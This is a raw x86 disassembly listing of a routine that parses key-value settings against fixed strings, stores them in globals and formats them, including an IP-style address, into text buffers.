1314a4ca:	e8 a3 b0 ff ff       	call   0x13145572
1314a4cf:	83 c4 0c             	add    $0xc,%esp
1314a4d2:	85 c0                	test   %eax,%eax
1314a4d4:	0f 84 42 04 00 00    	je     0x1314a91c
1314a4da:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a4e0:	6a 02                	push   $0x2
1314a4e2:	50                   	push   %eax
1314a4e3:	57                   	push   %edi
1314a4e4:	e8 89 b0 ff ff       	call   0x13145572
1314a4e9:	83 c4 0c             	add    $0xc,%esp
1314a4ec:	85 c0                	test   %eax,%eax
1314a4ee:	0f 84 28 04 00 00    	je     0x1314a91c
1314a4f4:	8d b3 64 76 17 13    	lea    0x13177664(%ebx),%esi
1314a4fa:	68 4c 21 15 13       	push   $0x1315214c
1314a4ff:	68 00 d1 14 13       	push   $0x1314d100
1314a504:	56                   	push   %esi
1314a505:	ff 15 98 39 15 13    	call   *0x13153998
1314a50b:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314a511:	68 40 21 15 13       	push   $0x13152140
1314a516:	50                   	push   %eax
1314a517:	e8 10 82 ff ff       	call   0x1314272c
1314a51c:	83 c4 14             	add    $0x14,%esp
1314a51f:	85 c0                	test   %eax,%eax
1314a521:	75 2b                	jne    0x1314a54e
1314a523:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a529:	68 38 21 15 13       	push   $0x13152138
1314a52e:	50                   	push   %eax
1314a52f:	e8 f8 81 ff ff       	call   0x1314272c
1314a534:	59                   	pop    %ecx
1314a535:	85 c0                	test   %eax,%eax
1314a537:	59                   	pop    %ecx
1314a538:	75 53                	jne    0x1314a58d
1314a53a:	21 05 00 24 15 13    	and    %eax,0x13152400
1314a540:	68 1c 21 15 13       	push   $0x1315211c
1314a545:	56                   	push   %esi
1314a546:	ff 15 98 39 15 13    	call   *0x13153998
1314a54c:	59                   	pop    %ecx
1314a54d:	59                   	pop    %ecx
1314a54e:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314a554:	68 10 21 15 13       	push   $0x13152110
1314a559:	50                   	push   %eax
1314a55a:	e8 cd 81 ff ff       	call   0x1314272c
1314a55f:	59                   	pop    %ecx
1314a560:	85 c0                	test   %eax,%eax
1314a562:	59                   	pop    %ecx
1314a563:	75 7d                	jne    0x1314a5e2
1314a565:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a56b:	50                   	push   %eax
1314a56c:	e8 97 82 ff ff       	call   0x13142808
1314a571:	85 c0                	test   %eax,%eax
1314a573:	59                   	pop    %ecx
1314a574:	a3 04 24 15 13       	mov    %eax,0x13152404
1314a579:	74 59                	je     0x1314a5d4
1314a57b:	50                   	push   %eax
1314a57c:	68 f8 20 15 13       	push   $0x131520f8
1314a581:	56                   	push   %esi
1314a582:	ff 15 98 39 15 13    	call   *0x13153998
1314a588:	83 c4 0c             	add    $0xc,%esp
1314a58b:	eb 55                	jmp    0x1314a5e2
1314a58d:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a593:	50                   	push   %eax
1314a594:	ff 15 ac 39 15 13    	call   *0x131539ac
1314a59a:	85 c0                	test   %eax,%eax
1314a59c:	a3 00 24 15 13       	mov    %eax,0x13152400
1314a5a1:	74 9d                	je     0x1314a540
1314a5a3:	8b c8                	mov    %eax,%ecx
1314a5a5:	33 d2                	xor    %edx,%edx
1314a5a7:	c1 e9 10             	shr    $0x10,%ecx
1314a5aa:	8a d5                	mov    %ch,%dl
1314a5ac:	0f b6 d2             	movzbl %dl,%edx
1314a5af:	0f b6 c9             	movzbl %cl,%ecx
1314a5b2:	52                   	push   %edx
1314a5b3:	51                   	push   %ecx
1314a5b4:	33 c9                	xor    %ecx,%ecx
1314a5b6:	8a cc                	mov    %ah,%cl
1314a5b8:	0f b6 c9             	movzbl %cl,%ecx
1314a5bb:	0f b6 c0             	movzbl %al,%eax
1314a5be:	51                   	push   %ecx
1314a5bf:	50                   	push   %eax
1314a5c0:	68 d4 20 15 13       	push   $0x131520d4
1314a5c5:	56                   	push   %esi
1314a5c6:	ff 15 98 39 15 13    	call   *0x13153998
1314a5cc:	83 c4 18             	add    $0x18,%esp
1314a5cf:	e9 7a ff ff ff       	jmp    0x1314a54e
1314a5d4:	68 b8 20 15 13       	push   $0x131520b8
1314a5d9:	56                   	push   %esi
1314a5da:	ff 15 98 39 15 13    	call   *0x13153998
1314a5e0:	59                   	pop    %ecx
1314a5e1:	59                   	pop    %ecx
1314a5e2:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314a5e8:	68 ac 20 15 13       	push   $0x131520ac
1314a5ed:	50                   	push   %eax
1314a5ee:	e8 39 81 ff ff       	call   0x1314272c
1314a5f3:	59                   	pop    %ecx
1314a5f4:	85 c0                	test   %eax,%eax
1314a5f6:	59                   	pop    %ecx
1314a5f7:	75 36                	jne    0x1314a62f
1314a5f9:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a5ff:	50                   	push   %eax
1314a600:	e8 03 82 ff ff       	call   0x13142808
1314a605:	85 c0                	test   %eax,%eax
1314a607:	59                   	pop    %ecx
1314a608:	a3 08 24 15 13       	mov    %eax,0x13152408
1314a60d:	74 12                	je     0x1314a621
1314a60f:	50                   	push   %eax
1314a610:	68 94 20 15 13       	push   $0x13152094
1314a615:	56                   	push   %esi
1314a616:	ff 15 98 39 15 13    	call   *0x13153998
1314a61c:	83 c4 0c             	add    $0xc,%esp
1314a61f:	eb 0e                	jmp    0x1314a62f
1314a621:	68 78 20 15 13       	push   $0x13152078
1314a626:	56                   	push   %esi
1314a627:	ff 15 98 39 15 13    	call   *0x13153998
1314a62d:	59                   	pop    %ecx
1314a62e:	59                   	pop    %ecx
1314a62f:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314a635:	68 70 20 15 13       	push   $0x13152070
1314a63a:	50                   	push   %eax
1314a63b:	e8 ec 80 ff ff       	call   0x1314272c
1314a640:	59                   	pop    %ecx
1314a641:	85 c0                	test   %eax,%eax
1314a643:	59                   	pop    %ecx
1314a644:	75 21                	jne    0x1314a667
1314a646:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a64c:	50                   	push   %eax
1314a64d:	e8 b6 81 ff ff       	call   0x13142808
1314a652:	50                   	push   %eax
1314a653:	68 58 20 15 13       	push   $0x13152058
1314a658:	56                   	push   %esi
1314a659:	a3 34 fc 14 13       	mov    %eax,0x1314fc34
1314a65e:	ff 15 98 39 15 13    	call   *0x13153998
1314a664:	83 c4 10             	add    $0x10,%esp
1314a667:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314a66d:	68 4c 20 15 13       	push   $0x1315204c
1314a672:	50                   	push   %eax
1314a673:	e8 b4 80 ff ff       	call   0x1314272c
1314a678:	59                   	pop    %ecx
1314a679:	85 c0                	test   %eax,%eax
1314a67b:	59                   	pop    %ecx
1314a67c:	75 44                	jne    0x1314a6c2
1314a67e:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a684:	50                   	push   %eax
1314a685:	e8 7e 81 ff ff       	call   0x13142808
1314a68a:	83 f8 32             	cmp    $0x32,%eax
1314a68d:	59                   	pop    %ecx
1314a68e:	7e 11                	jle    0x1314a6a1
1314a690:	bf 3c 20 15 13       	mov    $0x1315203c,%edi
1314a695:	57                   	push   %edi
1314a696:	56                   	push   %esi
1314a697:	ff 15 98 39 15 13    	call   *0x13153998
1314a69d:	59                   	pop    %ecx
1314a69e:	59                   	pop    %ecx
1314a69f:	eb 26                	jmp    0x1314a6c7
1314a6a1:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a6a7:	50                   	push   %eax
1314a6a8:	e8 5b 81 ff ff       	call   0x13142808
1314a6ad:	50                   	push   %eax
1314a6ae:	68 20 20 15 13       	push   $0x13152020
1314a6b3:	56                   	push   %esi
1314a6b4:	a3 38 fc 14 13       	mov    %eax,0x1314fc38
1314a6b9:	ff 15 98 39 15 13    	call   *0x13153998
1314a6bf:	83 c4 10             	add    $0x10,%esp
1314a6c2:	bf 3c 20 15 13       	mov    $0x1315203c,%edi
1314a6c7:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314a6cd:	68 14 20 15 13       	push   $0x13152014
1314a6d2:	50                   	push   %eax
1314a6d3:	e8 54 80 ff ff       	call   0x1314272c
1314a6d8:	59                   	pop    %ecx
1314a6d9:	85 c0                	test   %eax,%eax
1314a6db:	59                   	pop    %ecx
1314a6dc:	75 3f                	jne    0x1314a71d
1314a6de:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a6e4:	50                   	push   %eax
1314a6e5:	e8 1e 81 ff ff       	call   0x13142808
1314a6ea:	83 f8 32             	cmp    $0x32,%eax
1314a6ed:	59                   	pop    %ecx
1314a6ee:	7e 0c                	jle    0x1314a6fc
1314a6f0:	57                   	push   %edi
1314a6f1:	56                   	push   %esi
1314a6f2:	ff 15 98 39 15 13    	call   *0x13153998
1314a6f8:	59                   	pop    %ecx
1314a6f9:	59                   	pop    %ecx
1314a6fa:	eb 21                	jmp    0x1314a71d
1314a6fc:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a702:	50                   	push   %eax
1314a703:	e8 00 81 ff ff       	call   0x13142808
1314a708:	50                   	push   %eax
1314a709:	68 f8 1f 15 13       	push   $0x13151ff8
1314a70e:	56                   	push   %esi
1314a70f:	a3 a0 f3 14 13       	mov    %eax,0x1314f3a0
1314a714:	ff 15 98 39 15 13    	call   *0x13153998
1314a71a:	83 c4 10             	add    $0x10,%esp
1314a71d:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314a723:	68 f0 1f 15 13       	push   $0x13151ff0
1314a728:	50                   	push   %eax
1314a729:	e8 fe 7f ff ff       	call   0x1314272c
1314a72e:	59                   	pop    %ecx
1314a72f:	85 c0                	test   %eax,%eax
1314a731:	59                   	pop    %ecx
1314a732:	75 21                	jne    0x1314a755
1314a734:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a73a:	50                   	push   %eax
1314a73b:	e8 c8 80 ff ff       	call   0x13142808
1314a740:	50                   	push   %eax
1314a741:	68 d8 1f 15 13       	push   $0x13151fd8
1314a746:	56                   	push   %esi
1314a747:	a3 a4 f3 14 13       	mov    %eax,0x1314f3a4
1314a74c:	ff 15 98 39 15 13    	call   *0x13153998
1314a752:	83 c4 10             	add    $0x10,%esp
1314a755:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314a75b:	68 d0 1f 15 13       	push   $0x13151fd0
1314a760:	50                   	push   %eax
1314a761:	e8 c6 7f ff ff       	call   0x1314272c
1314a766:	59                   	pop    %ecx
1314a767:	85 c0                	test   %eax,%eax
1314a769:	59                   	pop    %ecx
1314a76a:	75 21                	jne    0x1314a78d
1314a76c:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a772:	50                   	push   %eax
1314a773:	e8 90 80 ff ff       	call   0x13142808
1314a778:	50                   	push   %eax
1314a779:	68 b8 1f 15 13       	push   $0x13151fb8
1314a77e:	56                   	push   %esi
1314a77f:	a3 bc 0b 15 13       	mov    %eax,0x13150bbc
1314a784:	ff 15 98 39 15 13    	call   *0x13153998
1314a78a:	83 c4 10             	add    $0x10,%esp
1314a78d:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314a793:	68 ac 1f 15 13       	push   $0x13151fac
1314a798:	50                   	push   %eax
1314a799:	e8 8e 7f ff ff       	call   0x1314272c
1314a79e:	59                   	pop    %ecx
1314a79f:	85 c0                	test   %eax,%eax
1314a7a1:	59                   	pop    %ecx
1314a7a2:	75 3f                	jne    0x1314a7e3
1314a7a4:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a7aa:	50                   	push   %eax
1314a7ab:	e8 58 80 ff ff       	call   0x13142808
1314a7b0:	83 f8 32             	cmp    $0x32,%eax
1314a7b3:	59                   	pop    %ecx
1314a7b4:	7e 0c                	jle    0x1314a7c2
1314a7b6:	57                   	push   %edi
1314a7b7:	56                   	push   %esi
1314a7b8:	ff 15 98 39 15 13    	call   *0x13153998
1314a7be:	59                   	pop    %ecx
1314a7bf:	59                   	pop    %ecx
1314a7c0:	eb 21                	jmp    0x1314a7e3
1314a7c2:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a7c8:	50                   	push   %eax
1314a7c9:	e8 3a 80 ff ff       	call   0x13142808
1314a7ce:	50                   	push   %eax
1314a7cf:	68 90 1f 15 13       	push   $0x13151f90
1314a7d4:	56                   	push   %esi
1314a7d5:	a3 c0 0b 15 13       	mov    %eax,0x13150bc0
1314a7da:	ff 15 98 39 15 13    	call   *0x13153998
1314a7e0:	83 c4 10             	add    $0x10,%esp
1314a7e3:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314a7e9:	68 88 1f 15 13       	push   $0x13151f88
1314a7ee:	50                   	push   %eax
1314a7ef:	e8 38 7f ff ff       	call   0x1314272c
1314a7f4:	59                   	pop    %ecx
1314a7f5:	85 c0                	test   %eax,%eax
1314a7f7:	59                   	pop    %ecx
1314a7f8:	75 21                	jne    0x1314a81b
1314a7fa:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a800:	50                   	push   %eax
1314a801:	e8 02 80 ff ff       	call   0x13142808
1314a806:	50                   	push   %eax
1314a807:	68 70 1f 15 13       	push   $0x13151f70
1314a80c:	56                   	push   %esi
1314a80d:	a3 3c 0c 15 13       	mov    %eax,0x13150c3c
1314a812:	ff 15 98 39 15 13    	call   *0x13153998
1314a818:	83 c4 10             	add    $0x10,%esp
1314a81b:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314a821:	68 64 1f 15 13       	push   $0x13151f64
1314a826:	50                   	push   %eax
1314a827:	e8 00 7f ff ff       	call   0x1314272c
1314a82c:	59                   	pop    %ecx
1314a82d:	85 c0                	test   %eax,%eax
1314a82f:	59                   	pop    %ecx
1314a830:	75 41                	jne    0x1314a873
1314a832:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a838:	50                   	push   %eax
1314a839:	e8 ca 7f ff ff       	call   0x13142808
1314a83e:	3d 00 10 00 00       	cmp    $0x1000,%eax
1314a843:	59                   	pop    %ecx
1314a844:	7e 0c                	jle    0x1314a852
1314a846:	57                   	push   %edi
1314a847:	56                   	push   %esi
1314a848:	ff 15 98 39 15 13    	call   *0x13153998
1314a84e:	59                   	pop    %ecx
1314a84f:	59                   	pop    %ecx
1314a850:	eb 21                	jmp    0x1314a873
1314a852:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a858:	50                   	push   %eax
1314a859:	e8 aa 7f ff ff       	call   0x13142808
1314a85e:	50                   	push   %eax
1314a85f:	68 48 1f 15 13       	push   $0x13151f48
1314a864:	56                   	push   %esi
1314a865:	a3 30 fc 14 13       	mov    %eax,0x1314fc30
1314a86a:	ff 15 98 39 15 13    	call   *0x13153998
1314a870:	83 c4 10             	add    $0x10,%esp
1314a873:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314a879:	68 3c 1f 15 13       	push   $0x13151f3c
1314a87e:	50                   	push   %eax
1314a87f:	e8 a8 7e ff ff       	call   0x1314272c
1314a884:	59                   	pop    %ecx
1314a885:	85 c0                	test   %eax,%eax
1314a887:	59                   	pop    %ecx
1314a888:	75 41                	jne    0x1314a8cb
1314a88a:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a890:	50                   	push   %eax
1314a891:	e8 72 7f ff ff       	call   0x13142808
1314a896:	3d 00 10 00 00       	cmp    $0x1000,%eax
1314a89b:	59                   	pop    %ecx
1314a89c:	7e 0c                	jle    0x1314a8aa
1314a89e:	57                   	push   %edi
1314a89f:	56                   	push   %esi
1314a8a0:	ff 15 98 39 15 13    	call   *0x13153998
1314a8a6:	59                   	pop    %ecx
1314a8a7:	59                   	pop    %ecx
1314a8a8:	eb 21                	jmp    0x1314a8cb
1314a8aa:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a8b0:	50                   	push   %eax
1314a8b1:	e8 52 7f ff ff       	call   0x13142808
1314a8b6:	50                   	push   %eax
1314a8b7:	68 20 1f 15 13       	push   $0x13151f20
1314a8bc:	56                   	push   %esi
1314a8bd:	a3 38 0c 15 13       	mov    %eax,0x13150c38
1314a8c2:	ff 15 98 39 15 13    	call   *0x13153998
1314a8c8:	83 c4 10             	add    $0x10,%esp
1314a8cb:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314a8d1:	68 14 1f 15 13       	push   $0x13151f14
1314a8d6:	50                   	push   %eax
1314a8d7:	e8 50 7e ff ff       	call   0x1314272c
1314a8dc:	59                   	pop    %ecx
1314a8dd:	85 c0                	test   %eax,%eax
1314a8df:	59                   	pop    %ecx
1314a8e0:	0f 85 23 20 00 00    	jne    0x1314c909
1314a8e6:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a8ec:	50                   	push   %eax
1314a8ed:	e8 16 7f ff ff       	call   0x13142808
1314a8f2:	83 f8 32             	cmp    $0x32,%eax
1314a8f5:	59                   	pop    %ecx
1314a8f6:	7e 07                	jle    0x1314a8ff
1314a8f8:	57                   	push   %edi
1314a8f9:	56                   	push   %esi
1314a8fa:	e9 e4 1f 00 00       	jmp    0x1314c8e3
1314a8ff:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314a905:	50                   	push   %eax
1314a906:	e8 fd 7e ff ff       	call   0x13142808
1314a90b:	50                   	push   %eax
1314a90c:	68 fc 1e 15 13       	push   $0x13151efc
1314a911:	a3 40 0c 15 13       	mov    %eax,0x13150c40
1314a916:	56                   	push   %esi
1314a917:	e9 9e f9 ff ff       	jmp    0x1314a2ba
1314a91c:	68 e0 1e 15 13       	push   $0x13151ee0
1314a921:	68 00 d1 14 13       	push   $0x1314d100
1314a926:	e9 ce 1f 00 00       	jmp    0x1314c8f9
1314a92b:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314a931:	68 d8 1e 15 13       	push   $0x13151ed8
1314a936:	50                   	push   %eax
1314a937:	e8 f0 7d ff ff       	call   0x1314272c
1314a93c:	59                   	pop    %ecx
1314a93d:	85 c0                	test   %eax,%eax
1314a93f:	59                   	pop    %ecx
1314a940:	75 35                	jne    0x1314a977
1314a942:	8b 75 08             	mov    0x8(%ebp),%esi
1314a945:	56                   	push   %esi
1314a946:	e8 d8 b1 ff ff       	call   0x13145b23
1314a94b:	59                   	pop    %ecx
1314a94c:	50                   	push   %eax
1314a94d:	56                   	push   %esi
1314a94e:	e8 c6 e2 ff ff       	call   0x13148c19
1314a953:	59                   	pop    %ecx
1314a954:	50                   	push   %eax
1314a955:	56                   	push   %esi
1314a956:	e8 be e2 ff ff       	call   0x13148c19
1314a95b:	59                   	pop    %ecx
1314a95c:	50                   	push   %eax
1314a95d:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314a963:	68 c0 1e 15 13       	push   $0x13151ec0
1314a968:	50                   	push   %eax
1314a969:	ff 15 98 39 15 13    	call   *0x13153998
1314a96f:	83 c4 14             	add    $0x14,%esp
1314a972:	e9 5c 1c 00 00       	jmp    0x1314c5d3
1314a977:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314a97d:	68 b8 1e 15 13       	push   $0x13151eb8
1314a982:	50                   	push   %eax
1314a983:	e8 a4 7d ff ff       	call   0x1314272c
1314a988:	59                   	pop    %ecx
1314a989:	85 c0                	test   %eax,%eax
1314a98b:	59                   	pop    %ecx
1314a98c:	0f 85 cd 01 00 00    	jne    0x1314ab5f
1314a992:	33 f6                	xor    %esi,%esi
1314a994:	6a 46                	push   $0x46
1314a996:	bf c4 66 17 13       	mov    $0x131766c4,%edi
1314a99b:	56                   	push   %esi
1314a99c:	57                   	push   %edi
1314a99d:	e8 80 7c ff ff       	call   0x13142622
1314a9a2:	6a 46                	push   $0x46
1314a9a4:	56                   	push   %esi
1314a9a5:	68 10 67 17 13       	push   $0x13176710
1314a9aa:	e8 73 7c ff ff       	call   0x13142622
1314a9af:	68 00 01 00 00       	push   $0x100
1314a9b4:	56                   	push   %esi
1314a9b5:	68 70 96 17 13       	push   $0x13179670
1314a9ba:	e8 63 7c ff ff       	call   0x13142622
1314a9bf:	68 80 00 00 00       	push   $0x80
1314a9c4:	56                   	push   %esi
1314a9c5:	be d8 67 17 13       	mov    $0x131767d8,%esi
1314a9ca:	56                   	push   %esi
1314a9cb:	e8 52 7c ff ff       	call   0x13142622
1314a9d0:	83 c4 30             	add    $0x30,%esp
1314a9d3:	6a 46                	push   $0x46
1314a9d5:	57                   	push   %edi
1314a9d6:	68 ac 1e 15 13       	push   $0x13151eac
1314a9db:	6a 00                	push   $0x0
1314a9dd:	bf 09 04 00 00       	mov    $0x409,%edi
1314a9e2:	6a 00                	push   $0x0
1314a9e4:	57                   	push   %edi
1314a9e5:	ff 15 9c 33 15 13    	call   *0x1315339c
1314a9eb:	6a 46                	push   $0x46
1314a9ed:	68 10 67 17 13       	push   $0x13176710
1314a9f2:	68 a0 1e 15 13       	push   $0x13151ea0
1314a9f7:	6a 00                	push   $0x0
1314a9f9:	6a 00                	push   $0x0
1314a9fb:	57                   	push   %edi
1314a9fc:	ff 15 c8 33 15 13    	call   *0x131533c8
1314aa02:	68 00 01 00 00       	push   $0x100
1314aa07:	68 70 96 17 13       	push   $0x13179670
1314aa0c:	ff 15 50 35 15 13    	call   *0x13153550
1314aa12:	68 8c 0e 15 13       	push   $0x13150e8c
1314aa17:	56                   	push   %esi
1314aa18:	ff 15 90 33 15 13    	call   *0x13153390
1314aa1e:	a1 90 a5 17 13       	mov    0x1317a590,%eax
1314aa23:	c7 45 f0 98 1e 15 13 	movl   $0x13151e98,-0x10(%ebp)
1314aa2a:	85 c0                	test   %eax,%eax
1314aa2c:	75 03                	jne    0x1314aa31
1314aa2e:	89 75 f0             	mov    %esi,-0x10(%ebp)
1314aa31:	85 c0                	test   %eax,%eax
1314aa33:	74 07                	je     0x1314aa3c
1314aa35:	bf 98 1e 15 13       	mov    $0x13151e98,%edi
1314aa3a:	eb 0b                	jmp    0x1314aa47
1314aa3c:	ff 75 08             	pushl  0x8(%ebp)
1314aa3f:	e8 47 ab ff ff       	call   0x1314558b
1314aa44:	59                   	pop    %ecx
1314aa45:	8b f8                	mov    %eax,%edi
1314aa47:	8d b3 64 76 17 13    	lea    0x13177664(%ebx),%esi
1314aa4d:	e8 c5 ad ff ff       	call   0x13145817
1314aa52:	50                   	push   %eax
1314aa53:	ff 75 08             	pushl  0x8(%ebp)
1314aa56:	e8 a3 e1 ff ff       	call   0x13148bfe
1314aa5b:	59                   	pop    %ecx
1314aa5c:	50                   	push   %eax
1314aa5d:	ff 75 08             	pushl  0x8(%ebp)
1314aa60:	e8 7e e1 ff ff       	call   0x13148be3
1314aa65:	59                   	pop    %ecx
1314aa66:	50                   	push   %eax
1314aa67:	e8 40 ad ff ff       	call   0x131457ac
1314aa6c:	50                   	push   %eax
1314aa6d:	ff 75 08             	pushl  0x8(%ebp)
1314aa70:	e8 89 e1 ff ff       	call   0x13148bfe
1314aa75:	59                   	pop    %ecx
1314aa76:	50                   	push   %eax
1314aa77:	ff 75 08             	pushl  0x8(%ebp)
1314aa7a:	e8 64 e1 ff ff       	call   0x13148be3
1314aa7f:	59                   	pop    %ecx
1314aa80:	50                   	push   %eax
1314aa81:	68 c4 66 17 13       	push   $0x131766c4
1314aa86:	ff 75 08             	pushl  0x8(%ebp)
1314aa89:	e8 70 e1 ff ff       	call   0x13148bfe
1314aa8e:	59                   	pop    %ecx
1314aa8f:	50                   	push   %eax
1314aa90:	ff 75 08             	pushl  0x8(%ebp)
1314aa93:	e8 4b e1 ff ff       	call   0x13148be3
1314aa98:	59                   	pop    %ecx
1314aa99:	50                   	push   %eax
1314aa9a:	68 10 67 17 13       	push   $0x13176710
1314aa9f:	ff 75 08             	pushl  0x8(%ebp)
1314aaa2:	e8 57 e1 ff ff       	call   0x13148bfe
1314aaa7:	59                   	pop    %ecx
1314aaa8:	50                   	push   %eax
1314aaa9:	ff 75 08             	pushl  0x8(%ebp)
1314aaac:	e8 32 e1 ff ff       	call   0x13148be3
1314aab1:	59                   	pop    %ecx
1314aab2:	50                   	push   %eax
1314aab3:	6a 00                	push   $0x0
1314aab5:	e8 44 ae ff ff       	call   0x131458fe
1314aaba:	59                   	pop    %ecx
1314aabb:	50                   	push   %eax
1314aabc:	ff 75 08             	pushl  0x8(%ebp)
1314aabf:	e8 3a e1 ff ff       	call   0x13148bfe
1314aac4:	59                   	pop    %ecx
1314aac5:	50                   	push   %eax
1314aac6:	ff 75 08             	pushl  0x8(%ebp)
1314aac9:	e8 15 e1 ff ff       	call   0x13148be3
1314aace:	59                   	pop    %ecx
1314aacf:	50                   	push   %eax
1314aad0:	ff 75 f0             	pushl  -0x10(%ebp)
1314aad3:	ff 75 08             	pushl  0x8(%ebp)
1314aad6:	e8 23 e1 ff ff       	call   0x13148bfe
1314aadb:	59                   	pop    %ecx
1314aadc:	50                   	push   %eax
1314aadd:	ff 75 08             	pushl  0x8(%ebp)
1314aae0:	e8 fe e0 ff ff       	call   0x13148be3
1314aae5:	59                   	pop    %ecx
1314aae6:	50                   	push   %eax
1314aae7:	68 70 96 17 13       	push   $0x13179670
1314aaec:	ff 75 08             	pushl  0x8(%ebp)
1314aaef:	e8 0a e1 ff ff       	call   0x13148bfe
1314aaf4:	59                   	pop    %ecx
1314aaf5:	50                   	push   %eax
1314aaf6:	ff 75 08             	pushl  0x8(%ebp)
1314aaf9:	e8 e5 e0 ff ff       	call   0x13148be3
1314aafe:	59                   	pop    %ecx
1314aaff:	50                   	push   %eax
1314ab00:	e8 2a ad ff ff       	call   0x1314582f
1314ab05:	50                   	push   %eax
1314ab06:	ff 75 08             	pushl  0x8(%ebp)
1314ab09:	e8 f0 e0 ff ff       	call   0x13148bfe
1314ab0e:	59                   	pop    %ecx
1314ab0f:	50                   	push   %eax
1314ab10:	ff 75 08             	pushl  0x8(%ebp)
1314ab13:	e8 cb e0 ff ff       	call   0x13148be3
1314ab18:	59                   	pop    %ecx
1314ab19:	50                   	push   %eax
1314ab1a:	57                   	push   %edi
1314ab1b:	ff 75 08             	pushl  0x8(%ebp)
1314ab1e:	e8 db e0 ff ff       	call   0x13148bfe
1314ab23:	59                   	pop    %ecx
1314ab24:	50                   	push   %eax
1314ab25:	ff 75 08             	pushl  0x8(%ebp)
1314ab28:	e8 b6 e0 ff ff       	call   0x13148be3
1314ab2d:	59                   	pop    %ecx
1314ab2e:	50                   	push   %eax
1314ab2f:	ff 75 08             	pushl  0x8(%ebp)
1314ab32:	e8 e2 e0 ff ff       	call   0x13148c19
1314ab37:	59                   	pop    %ecx
1314ab38:	50                   	push   %eax
1314ab39:	68 04 1e 15 13       	push   $0x13151e04
1314ab3e:	56                   	push   %esi
1314ab3f:	ff 15 98 39 15 13    	call   *0x13153998
1314ab45:	83 c4 78             	add    $0x78,%esp
1314ab48:	83 3d 90 a5 17 13 00 	cmpl   $0x0,0x1317a590
1314ab4f:	0f 84 b4 1d 00 00    	je     0x1314c909
1314ab55:	68 58 68 17 13       	push   $0x13176858
1314ab5a:	e9 9a fd ff ff       	jmp    0x1314a8f9
1314ab5f:	a1 00 24 15 13       	mov    0x13152400,%eax
1314ab64:	85 c0                	test   %eax,%eax
1314ab66:	74 34                	je     0x1314ab9c
1314ab68:	8b c8                	mov    %eax,%ecx
1314ab6a:	33 d2                	xor    %edx,%edx
1314ab6c:	c1 e9 10             	shr    $0x10,%ecx
1314ab6f:	8a d5                	mov    %ch,%dl
1314ab71:	0f b6 d2             	movzbl %dl,%edx
1314ab74:	0f b6 c9             	movzbl %cl,%ecx
1314ab77:	52                   	push   %edx
1314ab78:	51                   	push   %ecx
1314ab79:	33 c9                	xor    %ecx,%ecx
1314ab7b:	8a cc                	mov    %ah,%cl
1314ab7d:	0f b6 c9             	movzbl %cl,%ecx
1314ab80:	0f b6 c0             	movzbl %al,%eax
1314ab83:	51                   	push   %ecx
1314ab84:	50                   	push   %eax
1314ab85:	8d 85 b4 fa ff ff    	lea    -0x54c(%ebp),%eax
1314ab8b:	68 f8 1d 15 13       	push   $0x13151df8
1314ab90:	50                   	push   %eax
1314ab91:	ff 15 98 39 15 13    	call   *0x13153998
1314ab97:	83 c4 18             	add    $0x18,%esp
1314ab9a:	eb 14                	jmp    0x1314abb0
1314ab9c:	8d 85 b4 fa ff ff    	lea    -0x54c(%ebp),%eax
1314aba2:	68 f0 1d 15 13       	push   $0x13151df0
1314aba7:	50                   	push   %eax
1314aba8:	ff 15 98 39 15 13    	call   *0x13153998
1314abae:	59                   	pop    %ecx
1314abaf:	59                   	pop    %ecx
1314abb0:	a1 04 24 15 13       	mov    0x13152404,%eax
1314abb5:	85 c0                	test   %eax,%eax
1314abb7:	74 15                	je     0x1314abce
1314abb9:	50                   	push   %eax
1314abba:	8d 45 e0             	lea    -0x20(%ebp),%eax
1314abbd:	68 ec 1d 15 13       	push   $0x13151dec
1314abc2:	50                   	push   %eax
1314abc3:	ff 15 98 39 15 13    	call   *0x13153998
1314abc9:	83 c4 0c             	add    $0xc,%esp
1314abcc:	eb 11                	jmp    0x1314abdf
1314abce:	8d 45 e0             	lea    -0x20(%ebp),%eax
1314abd1:	68 f0 1d 15 13       	push   $0x13151df0
1314abd6:	50                   	push   %eax
1314abd7:	ff 15 98 39 15 13    	call   *0x13153998
1314abdd:	59                   	pop    %ecx
1314abde:	59                   	pop    %ecx
